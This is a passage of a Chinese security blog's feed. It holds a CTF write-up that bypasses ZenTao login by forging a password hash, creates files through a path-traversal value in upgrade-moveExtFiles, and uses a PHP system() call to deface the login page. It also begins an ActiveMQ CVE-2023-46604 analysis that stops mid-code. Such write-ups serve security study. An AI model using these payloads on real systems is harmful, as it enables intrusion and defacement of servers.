    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑 2024 ezERP 出题记录</title>
    <link href="https://drun1baby.github.io/2024/02/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2024-ezERP-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://drun1baby.github.io/2024/02/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2024-ezERP-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2024-02-10T12:11:02.000Z</published>
    <updated>2024-02-10T12:11:31.119Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕了</p>]]></content>
    
    
    <summary type="html">西湖论剑 2024 ezERP 出题记录</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>强网杯 s7 决赛 Zent WP</title>
    <link href="https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/"/>
    <id>https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/</id>
    <published>2024-01-15T01:56:07.000Z</published>
    <updated>2024-02-01T13:04:09.111Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了，最后还是差一点，发现题目前台和我们想象中的不一样，后台已经 RCE 了，但是前台没过，上台直接汗流浃背了</p><h2 id="前台鉴权绕过"><a href="#前台鉴权绕过" class="headerlink" title="前台鉴权绕过"></a>前台鉴权绕过</h2><p>先来看一下题目给的 deploy</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2. 题目仅做过如下改动</span><br><span class="line"></span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;drop database zentaoep;drop database zentaomax;&quot;</span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;use zentao;update zt_user SET password=&#x27;123abc&#x27; where account =&#x27;admin&#x27;;&quot;</span><br><span class="line">rm -rf /opt/zbox/app/zentaoep &amp;&amp; rm -rf /opt/zbox/app/zentaomax &amp;&amp; rm -rf /opt/zbox/app/adminer &amp;&amp; rm -rf /opt/zbox/bin/htpasswd</span><br><span class="line"></span><br><span class="line">3.题目部署方法（展台采用同样方式部署）</span><br><span class="line"></span><br><span class="line">docker load -i zentao.tar</span><br><span class="line">docker run -dit  --name=zentao -p 30021:80  ctf2:latest</span><br><span class="line">docker exec -it zentao /opt/zbox/zbox restart</span><br></pre></td></tr></table></figure><p>但是将环境起了之后，会发现用 admin&#x2F;123abc 是没办法登录进去的</p><p>抓包之后的逻辑是在 <code>/module/user</code> 下的 control，login 方法，这里是 zentao 的路由处理。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/identify.png" class><p>跟进一下 <code>identify()</code> 函数，看一段代码就能看到最核心的鉴权部分了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">identify</span>(<span class="params"><span class="variable">$account</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$account</span> <span class="keyword">or</span> !<span class="variable">$password</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/* Check account rule in login.  */</span></span><br><span class="line">        <span class="keyword">if</span>(!validater::<span class="title function_ invoke__">checkAccount</span>(<span class="variable">$account</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Get the user first. If $password length is 32, don&#x27;t add the password condition.  */</span></span><br><span class="line">        <span class="variable">$record</span> = <span class="variable language_">$this</span>-&gt;dao-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;*&#x27;</span>)-&gt;<span class="keyword">from</span>(TABLE_USER)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="variable">$account</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">beginIF</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">32</span>)-&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;password&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))-&gt;<span class="title function_ invoke__">fi</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;deleted&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="number">0</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$record</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$passwordLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$passwordLength</span> &lt; <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$record</span>-&gt;account . <span class="variable">$record</span>-&gt;password . <span class="variable">$record</span>-&gt;last);</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$user</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$record</span>-&gt;password) <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里的判断是有问题的，按照正常的逻辑来说，密码应该是从数据库里面去取，去比对的，但是，当 <code>($passwordLength == 32)</code> 时，是让一个 hash 和密码进行比对，把这部分代码提取出来，看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>解读一下判断逻辑：</p><p>如果 session 里面存在 rand 字段，如果存在则把 password 与 rand 进行拼接，再 md5 一下，得到 hash。<br>如果 session 里面不存在 rand 字段，则直接把 passsword 的值赋给 hash。</p><p>随后比较 password 和 hash 是否相同。</p><p><code>$record-&gt;password</code> 是我们已知的，为 123abc，目前其实只需要知道 rand 是什么，就可以<strong>伪造 hash</strong> 了，从而<strong>绕过鉴权</strong>。</p><p>抓包看一下传参</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">account=admin&amp;password=fe87780190a502d7eb5f743907918ee4&amp;passwordStrength=0&amp;referer=&amp;verifyRand=1871116681&amp;keepLogin=0&amp;captcha=</span><br></pre></td></tr></table></figure><p>其中有一个参数为 <strong>verifyRand</strong>，对应代码里面的变量是 <code>$rand</code> 看一下是怎么来的</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/rand.png" class><p>很明显，对应的函数是 refreshRandom，所以前端发起请求只需要通过 <code>user-refreshRandom.html</code> 即可，这里再跟进 updateSessionRandom 函数</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/random.png" class><p>随机数，不多讲了，赋值。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/getRandom.png" class><p>太简单了，但凡比赛的时候看一点都能出。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/success.png" class><p>进了之后会让我重新修改密码，重新修改密码这里也需要按照上面的步骤再来一遍，再提交密码</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/reset.png" class><h2 id="后台-RCE"><a href="#后台-RCE" class="headerlink" title="后台 RCE"></a>后台 RCE</h2><p>有点骚，一开始一直在找 patch 和 diff，没想到最新版也有这个问题</p><p>最大的问题是有一个任意文件创建的漏洞，对应接口 <code>upgrade-moveExtFiles-1.html</code></p><p>来看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveExtFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>       = fixer::<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line">        <span class="variable">$customRoot</span> = <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension&#x27;</span> . DS . <span class="string">&#x27;custom&#x27;</span>;</span><br><span class="line">        <span class="variable">$response</span>   = <span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dirRoot</span>  = <span class="variable">$customRoot</span> . DS . <span class="title function_ invoke__">dirname</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fromPath</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getModuleRoot</span>() . <span class="variable">$file</span>;</span><br><span class="line">            <span class="variable">$toPath</span>   = <span class="variable">$dirRoot</span> . DS . <span class="variable">$fileName</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirRoot</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dirRoot</span>, <span class="number">0777</span>, <span class="literal">true</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;result&#x27;</span>]  = <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;command&#x27;</span>] = <span class="string">&#x27;chmod o=rwx -R &#x27;</span>. <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension/custom&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">copy</span>(<span class="variable">$fromPath</span>, <span class="variable">$toPath</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">replaceIncludePath</span>(<span class="variable">$toPath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>里面存在“危险”的函数是 mkdir，其实本身这并不是一个危险函数，只是用在组合利用上面就成了危险函数。</p><p>漏洞利用也非常明确，值得一提的是本身的请求是 <code>upgrade-moveExtFiles.html</code>，由于需要传一个 version 参数，所以需要加上 -1</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/mkdir.png" class><p>这一步有什么用呢？来看后台 -&gt; 二次开发 -&gt; 编辑器</p><p>当你要修改文件的时候会遇到这个问题</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/write.png" class><p>所以这里就可以写入 ok.txt 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files[0]=../../../../../../../../../opt/zbox/app/zentao/www/data/ok.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/ok.png" class><p>随后就可以使用编辑器进行 shell 的写入了，首页的界面是 <code>/zentao/editor-save-L29wdC96Ym94L2FwcC96ZW50YW8vbW9kdWxlL3VzZXIvdmlldy9sb2dpbi5odG1sLnBocA-edit.html</code>，参数是 b64 过去的</p><p>直接在编辑器里面写黑页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;Hacked By Nepnep&quot; &gt; /opt/zbox/app/zentao/module/user/view/login.html.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即可</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/shell.png" class><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>难受了，不过也学到了很多</p>]]></content>
    
    
    <summary type="html">强网杯 s7 决赛 Zent WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-01-05T11:44:02.000Z</published>
    <updated>2024-02-10T12:14:16.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-46604-Apache-ActiveMQ-RCE-漏洞分析"><a href="#CVE-2023-46604-Apache-ActiveMQ-RCE-漏洞分析" class="headerlink" title="CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析"></a>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache ActiveMQ 是美国（Apache）基金会的一套开源的消息中间件，它支持 Java 消息服务、集群、Spring Framework 等。</p><p>ActiveMQ 默认开放了 61616 端口用于接收 OpenWire 协议消息，由于针对异常消息的处理存在反射调用逻辑，攻击者可能通过构造恶意的序列化消息数据加载恶意类，执行任意代码。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>Apache ActiveMQ &lt; 5.18.3<br>Apache ActiveMQ &lt; 5.17.6<br>Apache ActiveMQ &lt; 5.16.7<br>Apache ActiveMQ &lt; 5.15.16</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>可以根据这里下载 <a class="link" href="https://activemq.apache.org/components/classic/download/">https://activemq.apache.org/components/classic/download/<i class="fas fa-external-link-alt"></i></a></p><p>也可以自己起 docker</p><p>这里的 maven 有一点坑，需要先起一个 spring 的项目，然后再导入 activemq-client 的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.activemq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>activemq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.17.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>diff 代码</p><p><a class="link" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java">https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java<i class="fas fa-external-link-alt"></i></a></p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>这里的漏洞看起来非常明显，<code>activemq-client/src/main/java/org/apache/activemq/openwire/v9/BaseDataStreamMarshaller#createThrowable</code> 方法，通过反射调用了任意方法。</p><p>这里的 diff 可以很明显看到多了个 <code>OpenWireUtil</code> 类，用来处理一种抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">validateIsThrowable</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!Throwable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class &quot;</span> + clazz + <span class="string">&quot; is not assignable to Throwable&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往下看，这里给了 Test 类，前面这一段代码是在处理反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>();  </span><br><span class="line">r.setException(<span class="keyword">new</span> <span class="title class_">Exception</span>());  </span><br><span class="line"><span class="type">ByteSequence</span> <span class="variable">bss</span> <span class="operator">=</span> format.marshal(r);  </span><br><span class="line"><span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> (ExceptionResponse) format.unmarshal(bss);</span><br></pre></td></tr></table></figure><p>看 Test 类里面的 <code>getExceptionMarshaller()</code> 方法，其中都判断到了一个类 <strong>ExceptionResponseMarshaller</strong>，跟进 <code>looseUnmarshal()</code> 方法，发现会走到 <code>org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#looseUnmarshalThrowable</code> 方法。<strong>BaseDataStreamMarshaller</strong> 类是用于支持在 ActiveMQ 消息传递系统中进行数据流序列化和反序列化的基类</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/looseUnmarsalThrowable.png" class><p>大致的漏洞思路目前已经比较明确了，最终触发点是 <code>org.apache.activemq.openwire.v1.BaseDataStreamMarshaller#createThrowable</code>  方法，有两个方法调用了这里，分别是 <code>tightUnmarsalThrowable/looseUnmarsalThrowable</code>，先以 <code>looseUnmarsalThrowable</code> 来看，它是怎么被调用的呢？是由 <code>org.apache.activemq.openwire.v1.ExceptionResponseMarshaller#looseUnmarshal</code> 方法调用的。而 <code>ExceptionResponseMarshaller</code> 是用来处理反序列化报错的，这里对应的类是 <code>ExceptionResponse</code> 类。所以这一条攻击链路还是比较清楚的，流程图如下。</p><img src="/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/route.png" class><p>接下来构造一个 Openwire 协议的包，发送，看一下处理流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jms.Connection;</span><br><span class="line"><span class="keyword">import</span> javax.jms.ConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.jms.Destination;</span><br><span class="line"><span class="keyword">import</span> javax.jms.MessageProducer;</span><br><span class="line"><span class="keyword">import</span> javax.jms.Session;</span><br><span class="line"><span class="keyword">import</span> javax.jms.TextMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActiveMQProducer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">brokerUrl</span> <span class="operator">=</span> <span class="string">&quot;tcp://192.168.80.139:61616&quot;</span>;</span><br><span class="line">        <span class="type">ConnectionFactory</span> <span class="variable">connectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQConnectionFactory</span>(brokerUrl);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> connectionFactory.createConnection();</span><br><span class="line">            <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> connection.createSession(<span class="literal">false</span>, Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">            <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> session.createQueue(<span 